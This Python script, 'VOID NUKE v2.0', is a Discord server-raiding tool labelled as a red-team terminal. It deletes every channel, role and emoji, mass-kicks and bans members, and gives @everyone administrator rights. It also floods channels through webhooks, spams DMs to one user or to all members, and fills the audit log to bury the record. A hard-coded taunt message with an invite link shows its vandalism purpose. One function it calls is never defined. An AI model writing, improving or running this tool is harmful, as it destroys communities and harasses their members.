#!/usr/bin/env python3
"""
VOID NUKE v2.0 — Discord Red Team Terminal
For authorized red team and penetration testing use only.
"""

import asyncio
import sys
import time
import threading
import collections

# ── Dependency check ─────────────────────────────────────────────────────────
for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet"),("aiohttp","aiohttp")]:
    try: __import__(mod)
    except ImportError:
        print(f"[!] Missing dependency: pip install {pkg}"); sys.exit(1)

import aiohttp
import pyfiglet
from rich.console import Console
from rich.rule    import Rule
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.live    import Live
from rich         import box
from rich.console import Group

console = Console(highlight=False)

# ── Token ─────────────────────────────────────────────────────────────────────
BASE_URL   = "https://discord.com/api/v10"
TOKEN      = ""          # loaded/set at runtime via _load_token() / _set_token()
TOKEN_FILE = "token.txt" # saved here so you don't re-enter every run

HDRS: dict = {
    "Content-Type": "application/json",
    "User-Agent":   "DiscordBot (void, 2.0)",
}

def _set_token(raw: str) -> None:
    """Normalise and apply a new token globally (strips whitespace + accidental 'Bot ' prefix)."""
    global TOKEN
    raw = raw.strip()
    # Remove accidental "Bot " prefix — we always add it ourselves
    if raw.lower().startswith("bot "):
        raw = raw[4:].strip()
    TOKEN = raw
    HDRS["Authorization"] = f"Bot {TOKEN}"

def _load_token() -> bool:
    """Load token from token.txt. Returns True if a non-empty token was found."""
    try:
        import os
        raw = open(TOKEN_FILE).read().strip()
        if raw:
            _set_token(raw)
            return True
    except Exception:
        pass
    return False

def _save_token() -> None:
    """Persist the current TOKEN to token.txt for next run."""
    try:
        open(TOKEN_FILE, "w").write(TOKEN)
    except Exception:
        pass

NUKE_MSG = "# ☢️ @everyone @here # SERVER NUKED BY VOID!! **EZ KIDDOS** > join now: https://discord.gg/hG7kuYV5X7 ☢️"
NUKE_CH  = "☢︱NUKED-BY-VOID-KIDS"

# ═══════════════════════════════════════════════════════════════════════════════
# STATS — thread-safe live counters
# ═══════════════════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self._l     = threading.Lock()
        self.done   = 0
        self.failed = 0
        self.rls    = 0
        self.total  = 0
        self._hist  = collections.deque(maxlen=60)
        self._start = time.time()

    def ok(self, n=1):
        with self._l:
            self.done += n
            self._hist.append((time.monotonic(), self.done))

    def fail(self, n=1):
        with self._l: self.failed += n

    def rl(self, n=1):
        with self._l: self.rls += n

    def set_total(self, n):
        with self._l: self.total = n

    def ops_per_sec(self):
        with self._l:
            if len(self._hist) < 2: return 0
            t0, d0 = self._hist[0]; t1, d1 = self._hist[-1]
            dt = t1 - t0
            return (d1 - d0) / dt if dt > 0 else 0

    def elapsed(self): return time.time() - self._start

    def eta(self):
        ops = self.ops_per_sec()
        if not ops or not self.total: return "?"
        return f"{(self.total - self.done) / ops:.0f}s"

    def reset(self):
        with self._l:
            self.done = self.failed = self.rls = self.total = 0
            self._hist.clear()
            self._start = time.time()

ST = Stats()

# ═══════════════════════════════════════════════════════════════════════════════
# RATE LIMITER
# ═══════════════════════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self):
        self._buckets: dict      = {}
        self._remaining: dict    = {}
        self._route_bucket: dict = {}
        self._global_ready       = asyncio.Event()
        self._global_ready.set()
        self._lock               = asyncio.Lock()

    def _bk(self, path): return self._route_bucket.get(path, path)

    async def pre_request(self, path):
        await self._global_ready.wait()
        bk  = self._bk(path)
        wait = 0
        async with self._lock:
            rem = self._remaining.get(bk, 1)
            if rem <= 0:
                reset_at = self._buckets.get(bk, 0)
                wait = reset_at - time.monotonic()
                if wait <= 0:
                    self._remaining.pop(bk, None)
                    self._buckets.pop(bk, None)
                    wait = 0
        if wait > 0:
            await asyncio.sleep(wait + 0.01)

    def update(self, path, resp):
        h         = resp.headers
        bucket    = h.get("X-RateLimit-Bucket")
        remaining = h.get("X-RateLimit-Remaining")
        reset_aft = h.get("X-RateLimit-Reset-After")
        if h.get("X-RateLimit-Global") == "true" and reset_aft:
            self._global_ready.clear()
            asyncio.get_event_loop().call_later(float(reset_aft), self._global_ready.set)
        if bucket:
            self._route_bucket[path] = bucket
            if remaining is not None: self._remaining[bucket] = int(remaining)
            if reset_aft is not None: self._buckets[bucket]   = time.monotonic() + float(reset_aft)

    async def handle_429(self, resp, data):
        ST.rl()
        wait = float(data.get("retry_after", 1.0))
        if resp.headers.get("X-RateLimit-Global") == "true":
            self._global_ready.clear()
            await asyncio.sleep(wait)
            self._global_ready.set()
        else:
            await asyncio.sleep(wait)

RL = RateLimiter()

# ═══════════════════════════════════════════════════════════════════════════════
# HTTP ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
_SESSION: aiohttp.ClientSession | None = None

def _make_connector():
    return aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, enable_cleanup_closed=True)

async def _req(method: str, path: str, json: dict = None, retries: int = 12):
    global _SESSION
    url = f"{BASE_URL}{path}"
    for attempt in range(retries):
        await RL.pre_request(path)
        try:
            async with _SESSION.request(method, url, headers=HDRS, json=json) as resp:
                RL.update(path, resp)
                if resp.status == 204:   ST.ok();   return {}
                if resp.status == 429:
                    data = await resp.json(content_type=None)
                    await RL.handle_429(resp, data); continue
                if resp.status in (200, 201): ST.ok(); return await resp.json(content_type=None)
                if resp.status in (400, 403, 404, 401): ST.fail(); return None
                await asyncio.sleep(min(0.4 * (attempt + 1), 3.0))
        except (aiohttp.ClientError, asyncio.TimeoutError): await asyncio.sleep(0.2)
        except Exception: await asyncio.sleep(0.3)
    ST.fail(); return None

async def _req_wh(url: str, content: str, retries: int = 8) -> bool:
    for _ in range(retries):
        try:
            async with _SESSION.post(url, json={"content": content},
                                     headers={"Content-Type":"application/json"}) as r:
                if r.status in (200, 204): ST.ok(); return True
                if r.status == 429:
                    d = await r.json(content_type=None)
                    await asyncio.sleep(float(d.get("retry_after", 1.0))); continue
                if r.status in (400, 401, 403, 404): ST.fail(); return False
        except Exception: await asyncio.sleep(0.2)
    ST.fail(); return False

# ═══════════════════════════════════════════════════════════════════════════════
# WORKER POOL
# ═══════════════════════════════════════════════════════════════════════════════
async def _pool(coros, n_workers: int = 100):
    q: asyncio.Queue = asyncio.Queue()
    for c in coros: await q.put(c)
    async def _worker():
        while True:
            try: coro = q.get_nowait()
            except asyncio.QueueEmpty: break
            try: await coro
            except Exception: pass
            q.task_done()
    await asyncio.gather(*[asyncio.create_task(_worker())
                           for _ in range(min(n_workers, len(coros)+1))],
                         return_exceptions=True)

def _progress_panel(label: str, color: str) -> Panel:
    done   = ST.done; failed = ST.failed; total = ST.total or 1
    pct    = min(done / total, 1.0)
    bar_w  = 38; filled = int(pct * bar_w)
    bar    = Text()
    bar.append("█" * filled, style=color)
    bar.append("░" * (bar_w - filled), style="dim")
    grid = Table.grid(padding=(0,2))
    grid.add_column(min_width=10, style="dim"); grid.add_column(min_width=16, style="bold white")
    grid.add_column(min_width=10, style="dim"); grid.add_column(min_width=14, style="bold white")
    grid.add_row("DONE",    f"{done:,} / {total:,}", "RATE",    f"{ST.ops_per_sec():,.0f} /s")
    grid.add_row("FAILED",  str(failed),              "RL HITS", str(ST.rls))
    grid.add_row("ELAPSED", f"{ST.elapsed():.0f}s",   "ETA",     ST.eta())
    prog = Text(); prog.append("  "); prog.append_text(bar)
    prog.append(f"  {pct*100:.0f}%", style=f"bold {color}")
    return Panel(Group(grid, Text(""), prog),
                 title=f"[bold {color}]  {label}  [/]",
                 border_style=color, box=box.DOUBLE_EDGE)

async def _live_pool(coros, n_workers: int, label: str, color: str):
    if not coros: return
    ST.set_total(len(coros))
    q: asyncio.Queue = asyncio.Queue()
    for c in coros: await q.put(c)
    async def _worker():
        while True:
            try: coro = q.get_nowait()
            except asyncio.QueueEmpty: break
            try: await coro
            except Exception: pass
            q.task_done()
    tasks = [asyncio.create_task(_worker()) for _ in range(min(n_workers, len(coros)+1))]
    with Live(console=console, refresh_per_second=4, transient=True) as live:
        while any(not t.done() for t in tasks):
            live.update(_progress_panel(label, color)); await asyncio.sleep(0.25)
        live.update(_progress_panel(label, color))

# ═══════════════════════════════════════════════════════════════════════════════
# WEBHOOK FLOOD ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
async def _flood_via_webhooks(channels: list, msg: str,
                              webhooks_per_channel: int = 6,
                              rounds: int = 50):
    _status(f"Creating webhooks ({webhooks_per_channel}/ch across {len(channels)} channels)…")
    wh_tasks = [mk_webhook(ch["id"]) for ch in channels for _ in range(webhooks_per_channel)]
    webhook_results = await asyncio.gather(*wh_tasks, return_exceptions=True)
    webhooks = [w for w in webhook_results
                if isinstance(w, dict) and w.get("id") and w.get("token")]

    if not webhooks:
        _fail("No webhooks created — falling back to bot messages")
        await _live_pool(
            [send_msg(c["id"], msg) for c in channels for _ in range(rounds)],
            n_workers=200, label="MESSAGE FLOOD", color="bright_red"
        )
        return

    _status(f"{len(webhooks)} webhooks ready — flooding {rounds} rounds each…")
    wh_urls = [f"https://discord.com/api/webhooks/{w['id']}/{w['token']}" for w in webhooks]
    ST.set_total(len(wh_urls) * rounds)
    ST.done = 0

    async def _fire(url: str):
        for _ in range(rounds):
            await _req_wh(url, msg)
            await asyncio.sleep(0.05)

    with Live(console=console, refresh_per_second=4, transient=True) as live:
        tasks = [asyncio.create_task(_fire(u)) for u in wh_urls]
        while any(not t.done() for t in tasks):
            live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
            await asyncio.sleep(0.25)
        live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
    await asyncio.gather(*tasks, return_exceptions=True)
    await asyncio.gather(*tasks, return_exceptions=True)

# ═══════════════════════════════════════════════════════════════════════════════
# API HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
async def api_self():              return await _req("GET", "/users/@me")
async def api_guilds():            return await _req("GET", "/users/@me/guilds") or []
async def api_guild(gid):          return await _req("GET", f"/guilds/{gid}?with_counts=true")
async def api_channels(gid):       return await _req("GET", f"/guilds/{gid}/channels") or []
async def api_roles(gid):          return await _req("GET", f"/guilds/{gid}/roles")    or []
async def api_members(gid):
    out, after = [], 0
    while True:
        chunk = await _req("GET", f"/guilds/{gid}/members?limit=1000&after={after}") or []
        if not chunk: break
        out.extend(chunk)
        if len(chunk) < 1000: break
        after = chunk[-1]["user"]["id"]
    return out

async def api_app_id():
    me = await api_self()
    return me.get("id") if me else None

async def _fresh_session() -> aiohttp.ClientSession:
    """Close any existing session and open a new one."""
    global _SESSION
    if _SESSION is not None:
        try: await _SESSION.close()
        except Exception: pass
        _SESSION = None
    _SESSION = aiohttp.ClientSession(
        connector=_make_connector(),
        timeout=aiohttp.ClientTimeout(total=15, connect=5),
    )
    return _SESSION

async def verify_token_verbose():
    """
    Verify the current TOKEN against Discord. Always uses the latest HDRS.
    Returns (ok: bool, me_dict | error_string).
    """
    global _SESSION
    if _SESSION is None:
        await _fresh_session()
    try:
        async with _SESSION.get(f"{BASE_URL}/users/@me", headers=HDRS) as resp:
            # Always read the body — don't trust content_length (Discord often omits it)
            try:
                body = await resp.json(content_type=None)
            except Exception:
                body = {}
            if resp.status == 200:
                return True, body
            if resp.status == 401:
                return False, ("HTTP 401 — Token invalid, expired, or bot was deleted.\n"
                               "  Regenerate your token in the Discord Developer Portal\n"
                               "  and paste the NEW token (never reuse an old one).")
            if resp.status == 403:
                return False, "HTTP 403 — Token missing scope or bot is suspended."
            if resp.status == 429:
                ra = body.get("retry_after", "?")
                return False, f"HTTP 429 — Rate limited. Retry after {ra}s."
            if resp.status >= 500:
                return False, f"HTTP {resp.status} — Discord server error (try again)."
            return False, f"HTTP {resp.status} — {body.get('message', 'unknown error')}"
    except aiohttp.ClientConnectorError as e:
        return False, f"Network error — cannot reach Discord: {e}"
    except asyncio.TimeoutError:
        return False, "Timeout — Discord not responding (check internet/VPN)."
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"

async def kick(gid, uid):          return await _req("DELETE", f"/guilds/{gid}/members/{uid}")
async def ban(gid, uid):           return await _req("PUT",    f"/guilds/{gid}/bans/{uid}",
                                                      json={"delete_message_days":0})
async def unban(gid, uid):         return await _req("DELETE", f"/guilds/{gid}/bans/{uid}")
async def del_channel(cid):        return await _req("DELETE", f"/channels/{cid}")
async def del_role(gid, rid):      return await _req("DELETE", f"/guilds/{gid}/roles/{rid}")
async def del_emoji(gid, eid):     return await _req("DELETE", f"/guilds/{gid}/emojis/{eid}")
async def send_msg(cid, txt):      return await _req("POST",   f"/channels/{cid}/messages",
                                                      json={"content":txt})
async def nick(gid, uid, n):       return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                      json={"nick":n})
async def mute_m(gid, uid, v):     return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                      json={"mute":v})
async def deaf_m(gid, uid, v):     return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                      json={"deaf":v})
async def disc_m(gid, uid):        return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                      json={"channel_id":None})
async def mk_channel(gid, name, t=0):
    return await _req("POST", f"/guilds/{gid}/channels", json={"name":name,"type":t})
async def mk_thread(cid, name):
    return await _req("POST", f"/channels/{cid}/threads",
                      json={"name":name,"auto_archive_duration":60,"type":12})
async def mk_webhook(cid, name="void"):
    return await _req("POST", f"/channels/{cid}/webhooks", json={"name":name})
async def ch_perms(cid, oid, allow, deny):
    return await _req("PUT", f"/channels/{cid}/permissions/{oid}",
                      json={"allow":str(allow),"deny":str(deny),"type":0})
async def edit_guild(gid, **kw):   return await _req("PATCH", f"/guilds/{gid}", json=kw)
async def dm_open(uid):            return await _req("POST",  "/users/@me/channels",
                                                      json={"recipient_id":str(uid)})
async def leave_guild(gid):        return await _req("DELETE", f"/users/@me/guilds/{gid}")

# ═══════════════════════════════════════════════════════════════════════════════
# UI HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
CYAN   = "cyan"
RED    = "bright_red"
GREEN  = "bright_green"
YELLOW = "bright_yellow"
DIM    = "dim"
WHITE  = "bold white"
TEAL   = "bright_cyan"

def _status(msg): console.print(f"  [dim]›[/]  {msg}")
def _ok(msg):     console.print(f"  [{GREEN}]✓[/]  [bold]{msg}[/]")
def _fail(msg):   console.print(f"  [{RED}]✗[/]  [bold]{msg}[/]")
def _warn(msg):   console.print(f"  [{YELLOW}]![/]  {msg}")

def _sep(color="cyan"):
    """Print a full-width separator line in the given color."""
    w = console.size.width
    console.print(f"[{color}]{'─' * w}[/]")

def _banner(me_name: str = "Unknown", me_id: str = ""):
    console.clear()
    # ASCII art title
    fig = pyfiglet.figlet_format("VOID  NUKE", font="doom")
    shades = [RED, "red", RED, "red", RED, "red"]
    for i, line in enumerate(fig.splitlines()):
        if line.strip():
            console.print(f"  [{shades[i % len(shades)]}]{line}[/]")
    console.print()
    _sep(RED)
    console.print(f"  [{DIM}]VOID NUKE v2.0  ·  Discord Red Team Terminal  ·  Authorized Use Only[/]")
    _sep(RED)
    console.print()
    console.print(f"  [dim]Loaded Successfully [/][{GREEN}]Version V1[/]")
    console.print(f"  [dim]Logged in As:[/] [{YELLOW}]{me_name}[/]"
                  + (f"  [dim]({me_id})[/]" if me_id else ""))
    console.print()

def _menu(me_name: str, me_id: str, guild_id: str | None):
    _banner(me_name, me_id)

    # Guild status line
    if guild_id:
        console.print(f"  [dim]Active Server:[/] [{TEAL}]{guild_id}[/]  "
                      f"[dim]│  Type[/] [bold white]S[/] [dim]to change[/]\n")
    else:
        console.print(f"  [dim]No server selected. Type[/] [bold white]S[/] "
                      f"[dim]to set a Server ID.[/]\n")

    # Print all 21 ops in two-column rows, no section headers
    items = MENU_ITEMS   # list of tuples: (key, label, ...)
    for i in range(0, len(items), 2):
        left_item  = items[i]
        right_item = items[i + 1] if i + 1 < len(items) else None
        k1, l1 = left_item[0], left_item[1]
        d1 = MENU_DESCS.get(k1, "")
        left = f"  [dim]>[/] [[{TEAL}]{k1:>2}[/]] [{WHITE}]{l1:<16}[/]  [{DIM}]{d1:<38}[/]"
        if right_item:
            k2, l2 = right_item[0], right_item[1]
            d2 = MENU_DESCS.get(k2, "")
            right = f"  [dim]>[/] [[{TEAL}]{k2:>2}[/]] [{WHITE}]{l2:<16}[/]  [{DIM}]{d2}[/]"
            console.print(left + right)
        else:
            console.print(left)

    console.print()
    console.print(f"  [dim]  R   Reload Bot[/]  "
                  f"[dim]│[/]  [dim]  0   Exit[/]")
    console.print()

# ═══════════════════════════════════════════════════════════════════════════════
# OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

# ── needs guild_id wrapper (all original ops take (gid, extra=None)) ─────────
def _need_gid(fn):
    """Wrap an original-style op(gid, extra) so it matches the new signature."""
    async def _wrapper(guild_id):
        gid = guild_id or input("  Server ID: ").strip()
        if not gid:
            _warn("No server ID entered, cancelled."); return guild_id
        await fn(gid)
        return gid
    _wrapper.__name__ = fn.__name__
    return _wrapper

def _need_gid_extra(fn, prompt: str):
    """Wrap an op that also needs an extra prompt."""
    async def _wrapper(guild_id):
        gid = guild_id or input("  Server ID: ").strip()
        if not gid:
            _warn("No server ID entered, cancelled."); return guild_id
        extra = input(f"  {prompt}").strip() or None
        await fn(gid, extra)
        return gid
    _wrapper.__name__ = fn.__name__
    return _wrapper

# ── All 21 original nuke operations ──────────────────────────────────────────

async def op_full_nuke(gid, _=None):
    _status("Phase 1 — fetching data + deleting channels in parallel…")
    channels, members, roles, me = await asyncio.gather(
        api_channels(gid), api_members(gid), api_roles(gid), api_self()
    )
    del_tasks = [del_channel(c["id"]) for c in channels]
    ST.set_total(len(del_tasks))
    rename_t  = asyncio.create_task(edit_guild(gid, name="☢ VOID NUKED ☢"))
    await _live_pool(del_tasks, n_workers=500, label="DELETING CHANNELS", color="bright_red")
    await rename_t
    _status("Phase 2 — kicking members + creating flood channels…")
    bot_id   = me["id"] if me else None
    targets  = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bot_id]
    kick_job = asyncio.create_task(_live_pool(
        [kick(gid, m["user"]["id"]) for m in targets], 500, "KICKING MEMBERS", "red"))
    ch_results = await asyncio.gather(*[mk_channel(gid, NUKE_CH) for _ in range(50)],
                                      return_exceptions=True)
    new_chs = [r for r in ch_results if isinstance(r, dict) and r.get("id")]
    await kick_job
    _status(f"Phase 3 — webhook flood on {len(new_chs)} channels…")
    if new_chs:
        await _flood_via_webhooks(new_chs, NUKE_MSG, webhooks_per_channel=6, rounds=40)
    _ok(f"Full nuke complete — {len(new_chs)} channels flooded")

async def op_bypass(gid, _=None):
    _status("Fetching data…")
    members, roles, me = await asyncio.gather(api_members(gid), api_roles(gid), api_self())
    bot_id = me["id"] if me else None
    bots   = [m for m in members if m["user"].get("bot") and m["user"]["id"] != bot_id]
    strip  = [_req("PATCH", f"/guilds/{gid}/roles/{r['id']}", json={"permissions":"0"})
              for r in roles if r["id"] != str(gid) and not r.get("managed")]
    await asyncio.gather(
        _live_pool(strip, 100, "STRIPPING ROLES", "yellow"),
        _pool([kick(gid, m["user"]["id"]) for m in bots], 200),
        return_exceptions=True,
    )
    await _req("PATCH", f"/guilds/{gid}/roles/{gid}", json={"permissions":"8"})
    _ok(f"Bypass done — {len(bots)} bots kicked, {len(strip)} roles stripped, @everyone admined")

async def op_mass_channel(gid, _=None):
    _status("Creating 50 channels…")
    results = await asyncio.gather(*[mk_channel(gid, NUKE_CH) for _ in range(50)],
                                   return_exceptions=True)
    created = [r for r in results if isinstance(r, dict) and r.get("id")]
    if created:
        await _flood_via_webhooks(created, NUKE_MSG, webhooks_per_channel=6, rounds=30)
    _ok(f"Mass channel done — {len(created)} channels flooded")

async def op_mass_kick(gid, _=None):
    _status("Fetching members…")
    members, me = await asyncio.gather(api_members(gid), api_self())
    bid     = me["id"] if me else None
    targets = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bid]
    await _live_pool([kick(gid, m["user"]["id"]) for m in targets],
                     500, "MASS KICK", "bright_red")
    _ok(f"Mass kick — {ST.done} kicked, {ST.failed} failed")

async def op_mass_ban(gid, _=None):
    _status("Fetching members…")
    members, me = await asyncio.gather(api_members(gid), api_self())
    bid     = me["id"] if me else None
    targets = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bid]
    await _live_pool([ban(gid, m["user"]["id"]) for m in targets],
                     500, "MASS BAN", "bright_red")
    _ok(f"Mass ban — {ST.done} banned, {ST.failed} failed")

async def op_role_wipe(gid, _=None):
    roles = await api_roles(gid)
    tasks = [del_role(gid, r["id"]) for r in roles
             if r["id"] != str(gid) and not r.get("managed")]
    await _live_pool(tasks, 100, "ROLE WIPE", "yellow")
    _ok(f"Role wipe — {ST.done} deleted")

async def op_emoji_wipe(gid, _=None):
    emojis = await api_emojis(gid)
    await _live_pool([del_emoji(gid, e["id"]) for e in emojis],
                     50, "EMOJI WIPE", "yellow")
    _ok(f"Emoji wipe — {ST.done} deleted")

async def op_nick_all(gid, extra=None):
    name = extra or "☢ VOID NUKED ☢"
    _status("Fetching members…")
    members, me = await asyncio.gather(api_members(gid), api_self())
    bid = me["id"] if me else None
    targets = [m for m in members if m["user"]["id"] != bid]
    await _live_pool([nick(gid, m["user"]["id"], name) for m in targets],
                     500, "NICK ALL", "bright_yellow")
    _ok(f"Nick all — {ST.done} renamed")

async def op_lockdown(gid, _=None):
    channels = await api_channels(gid)
    await _live_pool([ch_perms(c["id"], gid, 0, 1024) for c in channels],
                     500, "LOCKDOWN", "bright_magenta")
    _ok(f"Lockdown — {ST.done} channels hidden")

async def op_ghost(gid, _=None):
    _status("Running ghost loop (100 cycles)…")
    async def _cycle():
        ch = await mk_channel(gid, "\u200b")
        if ch and ch.get("id"):
            await asyncio.sleep(0.5)
            await del_channel(ch["id"])
    await _pool([_cycle() for _ in range(100)], n_workers=20)
    _ok("Ghost loop done")

async def op_thread_raid(gid, _=None):
    channels = await api_channels(gid)
    text_chs = [c for c in channels if c["type"] == 0]
    tasks    = [mk_thread(c["id"], f"void-{i}") for c in text_chs for i in range(50)]
    await _live_pool(tasks, 200, "THREAD RAID", "cyan")
    _ok(f"Thread raid — {ST.done} threads created")

async def op_audit_wipe(gid, _=None):
    channels = await api_channels(gid)
    text_chs = [c for c in channels if c["type"] == 0][:8]
    if not text_chs:
        _fail("No text channels"); return
    _status("Audit wipe running for 90s — Ctrl+C to stop…")
    deadline = time.monotonic() + 90
    async def _lane(cid):
        while time.monotonic() < deadline:
            t = await mk_thread(cid, ".")
            if t and t.get("id"):
                await asyncio.sleep(0.15)
                await del_channel(t["id"])
            await asyncio.sleep(0.05)
    await asyncio.gather(*[_lane(c["id"]) for c in text_chs], return_exceptions=True)
    _ok("Audit wipe done")

async def op_rename_server(gid, extra=None):
    name = extra or "☢ VOID NUKED ☢"
    await edit_guild(gid, name=name)
    _ok(f"Server renamed → {name}")

async def op_webhook_spam(gid, _=None):
    channels = await api_channels(gid)
    text_chs = [c for c in channels if c["type"] == 0]
    await _flood_via_webhooks(text_chs, NUKE_MSG, webhooks_per_channel=6, rounds=50)
    _ok(f"Webhook spam done — {ST.done} messages sent")

async def op_dm_spam(gid, extra=None):
    if not extra:
        try: extra = input("  USER_ID,message: ").strip()
        except (EOFError, KeyboardInterrupt): return
    parts = extra.split(",", 1)
    if len(parts) < 2:
        _fail("Format: USER_ID,message"); return
    uid, msg = parts[0].strip(), parts[1].strip()
    dm = await dm_open(uid)
    if not dm:
        _fail("Could not open DM channel"); return
    await _live_pool([send_msg(dm["id"], msg) for _ in range(300)],
                     15, "DM SPAM", "bright_green")
    _ok(f"DM spam — {ST.done} messages sent")

async def op_dm_all(gid, extra=None):
    msg = extra or NUKE_MSG
    _status("Fetching members…")
    members = await api_members(gid)
    non_bot = [m for m in members if not m["user"].get("bot")]
    async def _dm_one(uid):
        dm = await dm_open(uid)
        if dm: await send_msg(dm["id"], msg)
    await _live_pool([_dm_one(m["user"]["id"]) for m in non_bot],
                     10, "DM ALL", "bright_green")
    _ok(f"DM all — {ST.done} sent")

async def op_mute_all(gid, _=None):
    members = await api_members(gid)
    await _live_pool([mute_m(gid, m["user"]["id"], True) for m in members],
                     500, "MUTE ALL", "bright_cyan")
    _ok(f"Muted {ST.done}")

async def op_deafen_all(gid, _=None):
    members = await api_members(gid)
    await _live_pool([deaf_m(gid, m["user"]["id"], True) for m in members],
                     500, "DEAFEN ALL", "bright_cyan")
    _ok(f"Deafened {ST.done}")

async def op_disc_all(gid, _=None):
    members = await api_members(gid)
    await _live_pool([disc_m(gid, m["user"]["id"]) for m in members],
                     500, "DISCONNECT ALL", "bright_cyan")
    _ok(f"Disconnected {ST.done}")

async def op_server_info(gid, _=None):
    g, chs, roles = await asyncio.gather(api_guild(gid), api_channels(gid), api_roles(gid))
    if not g: _fail("Cannot fetch guild"); return
    t = Table.grid(padding=(0,3))
    t.add_column(style="dim"); t.add_column(style="bold white")
    t.add_row("Name",     g.get("name","?"))
    t.add_row("ID",       str(g.get("id","?")))
    t.add_row("Owner ID", str(g.get("owner_id","?")))
    t.add_row("Members",  str(g.get("approximate_member_count","?")))
    t.add_row("Channels", str(len(chs)))
    t.add_row("Roles",    str(len(roles)))
    t.add_row("2FA",      str(g.get("mfa_level","?")))
    t.add_row("Verified", str(g.get("verified", False)))
    console.print(Panel(t, title=f"[bold {YELLOW}]  SERVER INFO  [/]",
                        border_style=YELLOW, box=box.DOUBLE_EDGE))

async def op_user_info(gid, extra=None):
    uid  = extra or input("  User ID: ").strip()
    user = await _req("GET", f"/users/{uid}")
    if not user: _fail("Cannot fetch user"); return
    t = Table.grid(padding=(0,3))
    t.add_column(style="dim"); t.add_column(style="bold white")
    t.add_row("Username", f"{user.get('username','?')}#{user.get('discriminator','0')}")
    t.add_row("ID",       str(user.get("id","?")))
    t.add_row("Bot",      str(user.get("bot", False)))
    if gid:
        m = await _req("GET", f"/guilds/{gid}/members/{uid}")
        if m:
            t.add_row("Nickname", m.get("nick") or "—")
            t.add_row("Joined",   m.get("joined_at","?")[:10])
            t.add_row("Roles",    str(len(m.get("roles",[]))))
    console.print(Panel(t, title=f"[bold {TEAL}]  USER INFO  [/]",
                        border_style=TEAL, box=box.DOUBLE_EDGE))

async def op_reload_bot(guild_id: str | None) -> str | None:
    """Re-authenticate the bot — closes the old session and opens a fresh one."""
    _status("Closing current session…")
    await _fresh_session()
    ST.reset()
    _status("Verifying token with fresh session…")
    ok, me = await verify_token_verbose()
    if ok:
        _ok(f"Session reloaded — logged in as {me.get('username','?')} ({me.get('id','')})")
    else:
        _fail(f"Reload failed: {me}")
        console.print("  [dim]Token may have been reset. Enter the new one:[/]")
        try:
            raw = input("  New bot token (or Enter to skip): ").strip()
        except (EOFError, KeyboardInterrupt):
            raw = ""
        if raw:
            _set_token(raw)
            await _fresh_session()
            ok2, me2 = await verify_token_verbose()
            if ok2:
                _save_token()
                _ok(f"New token accepted — {me2.get('username','?')}")
            else:
                _fail(f"Still failing: {me2}")
    return guild_id

# ── Dispatch table — (label, needs_gid, needs_extra, extra_prompt, handler) ──
# handler signature: op_xxx(gid, extra=None)
MENU_ITEMS = [
    # key  label              needs_gid  needs_extra  prompt                     color           handler
    ("1",  "Full Nuke",       True,  False, None,                               "bright_red",    op_full_nuke),
    ("2",  "Bypass",          True,  False, None,                               "red",           op_bypass),
    ("3",  "Mass Channel",    True,  False, None,                               "bright_red",    op_mass_channel),
    ("4",  "Mass Kick",       True,  False, None,                               "red",           op_mass_kick),
    ("5",  "Mass Ban",        True,  False, None,                               "bright_red",    op_mass_ban),
    ("6",  "Role Wipe",       True,  False, None,                               "yellow",        op_role_wipe),
    ("7",  "Emoji Wipe",      True,  False, None,                               "yellow",        op_emoji_wipe),
    ("8",  "Nick All",        True,  True,  "Nickname (blank=☢ VOID NUKED ☢): ","bright_yellow", op_nick_all),
    ("9",  "Lockdown",        True,  False, None,                               "bright_magenta",op_lockdown),
    ("10", "Ghost Mode",      True,  False, None,                               "bright_cyan",   op_ghost),
    ("11", "Thread Raid",     True,  False, None,                               "cyan",          op_thread_raid),
    ("12", "Audit Wipe",      True,  False, None,                               "dim",           op_audit_wipe),
    ("13", "Rename Server",   True,  True,  "New name: ",                       "bright_yellow", op_rename_server),
    ("14", "Webhook Spam",    True,  False, None,                               "bright_green",  op_webhook_spam),
    ("15", "DM Spam",         False, True,  "USER_ID,message: ",                "bright_green",  op_dm_spam),
    ("16", "DM All",          True,  True,  "Message (blank=nuke msg): ",       "bright_green",  op_dm_all),
    ("17", "Mute All",        True,  False, None,                               "bright_cyan",   op_mute_all),
    ("18", "Deafen All",      True,  False, None,                               "bright_cyan",   op_deafen_all),
    ("19", "Disconnect All",  True,  False, None,                               "bright_cyan",   op_disc_all),
    ("20", "Server Info",     True,  False, None,                               "bright_white",  op_server_info),
    ("21", "User Info",       False, True,  "User ID (blank to prompt): ",      "bright_white",  op_user_info),
]

MENU_DESCS = {
    "1":  "Delete all + rename + kick + 50ch + flood",
    "2":  "Kick bots, strip roles, grant @everyone admin",
    "3":  "Create 50 channels and webhook-flood them",
    "4":  "Kick every non-bot member (500 workers)",
    "5":  "Permanently ban every non-bot member",
    "6":  "Delete every non-managed role",
    "7":  "Delete every emoji",
    "8":  "Rename every member (500 workers)",
    "9":  "Hide all channels from @everyone",
    "10": "100 rapid create/delete cycles",
    "11": "50 private threads per channel",
    "12": "Thread flood fills audit log for 90s",
    "13": "Rename the server",
    "14": "6 webhooks/ch × 50 rounds (300 streams)",
    "15": "300 DMs to one user",
    "16": "DM every member in the server",
    "17": "Server-mute all members (500 workers)",
    "18": "Server-deafen all members (500 workers)",
    "19": "Disconnect all from voice (500 workers)",
    "20": "Dump server intelligence",
    "21": "Dump user intelligence",
}

# Accept zero-padded input (01 → 1)
OPERATIONS = {}
for _item in MENU_ITEMS:
    _k = _item[0]
    OPERATIONS[_k] = _item
    OPERATIONS[_k.zfill(2)] = _item

